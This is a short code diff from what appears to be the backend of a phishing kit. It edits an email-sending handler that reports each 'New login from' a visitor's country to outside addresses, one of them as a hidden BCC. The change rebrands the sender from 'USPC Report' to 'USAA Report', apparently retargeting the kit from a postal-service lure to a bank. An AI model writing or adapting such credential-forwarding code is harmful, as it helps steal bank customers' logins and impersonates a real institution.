@@ -22,7 +22,7 @@ export default async function handler(req, res) {
 
   // Email options
   let mailOptions = {
-    from: '"USPC Report" <sendersage@mailo.com>', // Sender address
+    from: '"USAA Report" <sagehurt@mailo.com>', // Sender address
     to: 'newfundmaker@outlook.com', // List of recipients
     bcc: 'money@monemail.com', // BCC recipients
     subject: `New login from ${country}`, // Subject line including the sender's country
